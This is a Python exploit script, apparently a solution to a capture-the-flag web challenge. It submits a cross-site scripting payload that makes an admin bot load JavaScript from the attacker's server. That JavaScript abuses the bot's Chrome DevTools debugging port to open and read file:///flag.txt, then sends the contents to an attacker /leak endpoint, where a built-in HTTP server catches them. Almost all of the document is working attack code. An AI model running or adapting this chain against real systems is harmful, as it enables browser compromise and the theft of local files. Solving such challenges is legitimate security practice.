#!/usr/bin/env python3
import sys
import threading
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

CHALL_INTERNAL = "http://localhost:8080"
CDP_INTERNAL = "http://localhost:9222"

if len(sys.argv) != 3:
    raise SystemExit(f"usage: {sys.argv[0]} <challenge_url> <attacker_url>")

CHALLENGE = sys.argv[1].rstrip("/")
ATTACKER = sys.argv[2].rstrip("/")
ATTACKER_PORT = urllib.parse.urlparse(ATTACKER).port or 80

flag_box = {}
got_flag = threading.Event()

PAYLOAD = f"<script src={ATTACKER}/e.js></script>"
SINK = f"{CHALL_INTERNAL}/?boring=1&message={PAYLOAD}"

EJS = f"""
(async () => {{
  const base = '{CDP_INTERNAL}';
  const tgt = await (await fetch(base + '/json/new?file:///flag.txt',
                                {{method:'PUT'}})).json();
  const sock = new WebSocket(tgt.webSocketDebuggerUrl);
  const read = (id) => sock.send(JSON.stringify({{
    id, method: 'Runtime.evaluate',
    params: {{ expression: 'document.body.innerText', returnByValue: true }}
  }}));
  let tries = 0;
  sock.onopen = () => read(++tries);
  sock.onmessage = (ev) => {{
    const d = JSON.parse(ev.data);
    const val = d.result && d.result.result && d.result.result.value;
    if (val) {{ fetch('{ATTACKER}/leak?flag=' + encodeURIComponent(val)); return; }}
    if (tries < 20) setTimeout(() => read(++tries), 150);
  }};
}})();
"""


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _send(self, body, ctype):
        b = body.encode()
        try:
            self.send_response(200)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(b)))
            self.end_headers()
            self.wfile.write(b)
        except (BrokenPipeError, ConnectionResetError):
            pass

    def do_GET(self):
        u = urllib.parse.urlparse(self.path)
        if u.path == "/e.js":
            return self._send(EJS, "application/javascript")
        if u.path == "/leak":
            q = urllib.parse.parse_qs(u.query)
            if "flag" in q:
                flag_box["flag"] = q["flag"][0]
                got_flag.set()
            return self._send("ok", "text/plain")
        self._send("nope", "text/plain")


def main():
    server = ThreadingHTTPServer(("0.0.0.0", ATTACKER_PORT), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    print(f"[*] serving payload on :{ATTACKER_PORT}")

    data = urllib.parse.urlencode({"url": SINK}).encode()
    print(f"[*] submitting the boring-mode sink url to {CHALLENGE}/submit")
    print(f"    {SINK}")
    urllib.request.urlopen(f"{CHALLENGE}/submit", data=data, timeout=30).read()

    print("[*] waiting for the bot to run the payload ...")
    if not got_flag.wait(timeout=60):
        raise SystemExit("[!] no flag received (is the attacker URL reachable by the bot?)")
    print(flag_box["flag"])


if __name__ == "__main__":
    main()
